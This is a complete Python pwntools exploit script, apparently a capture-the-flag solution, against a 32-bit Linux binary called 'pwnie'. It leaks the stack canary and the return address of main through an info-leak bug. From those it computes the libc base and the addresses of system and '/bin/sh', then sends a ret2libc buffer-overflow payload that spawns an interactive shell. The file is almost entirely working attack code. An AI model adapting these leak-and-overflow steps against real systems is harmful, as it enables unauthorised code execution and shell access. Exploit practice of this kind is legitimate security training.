#!/usr/bin/env python2
from pwn import *
import re
import sys

# Set context for asm
context.clear()
context(os='linux', arch='i386', log_level='info', bits=32)

# qira 
H,P='localhost',4000
# remote
#H,P='54.218.14.40', 3032

# remote
#p = remote(H,P) # for remote testing

# local
p = process('./pwnie') # for local testing
print util.proc.pidof(p)
pause()

# use memory leak vulnerability
def leak_dword(index):
	#print p.recvline() # Preamble
	log.info("Sending wrong answer: {} 4".format(index))
	p.sendline(str(index)) # Index of canary
	p.sendline('4')
	p.recvuntil('Sorry was supposed to be ')
	response = p.recvline()
	results = re.findall(r'(-?[0-9]+)', response)
	if len(results) < 1:
		sys.stderr.write('Did not find stack data')
		sys.exit(1)
	
	return int(results[0],10) # Convert found dword to integer

# handle negative integers correctly
def i2b(i):
	return p32(i & 0xffffffff)

# read preamble message
print p.recvuntil('gets?') # Preamble

# leak stack canary
canary = leak_dword(13)
log.info("Canary: " + hex(canary & 0xffffffff))

# leak return address of main
main_ret = leak_dword(17)
log.info("main rip: " + hex(main_ret & 0xffffffff))

# calculate libc_start_main address
libc_start_main = main_ret -243
log.info("__libc_start_main @ " + hex(libc_start_main & 0xffffffff))

# calulate libc base and absolute addresses from offsets
libc_base = libc_start_main - 0x000199e0
system = libc_base + 0x0003fe70
bin_sh = libc_base + 0x15da8c

libc_base_local =  libc_start_main - 0x00019970
system_local = libc_base_local + 0x0003e3e0
bin_sh_local = libc_base_local + 0x15fa89

log.info("libc-base @ : " + hex(libc_base_local & 0xffffffff))
log.info("system @ : " + hex(system_local & 0xffffffff))
log.info("/bin/sh @ " + hex(bin_sh_local & 0xffffffff))

# trigger gets call and buffer overflow
p.sendline('1')
p.sendline('1')
p.recvuntil('Yea you cool.')

# create malicious payload
buf = ""
buf += "A" * 10			# buf
buf += i2b(canary)		# canary
buf += "B" * 8			# alignment
buf += "C" * 4			# ebp
buf += i2b(system_local)	# system from libc
buf += i2b(bin_sh_local)        # /bin/sh from libc

# trigger exploit
p.sendline(buf)

# open our shell \o/
p.interactive()
